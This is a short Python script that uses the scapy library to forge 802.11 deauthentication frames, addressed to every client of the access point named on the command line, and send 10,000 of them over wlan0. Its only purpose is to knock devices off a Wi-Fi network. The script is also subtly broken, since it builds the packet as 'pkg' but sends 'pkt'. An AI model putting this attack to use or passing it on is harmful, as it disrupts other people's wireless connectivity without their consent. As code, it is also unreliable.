import os
os.system("pip3 install scapy")
import sys
from scapy.all import *
mac1 = "ff:ff:ff:ff:ff:ff"
pkg = RadioTap() / Dot11( addr1 = mac1, addr2 = sys.argv[1], addr3 = sys.argv[1])/Dot11Deauth()
sendp(pkt, iface = "wlan0", count = 10000, inter = .2)
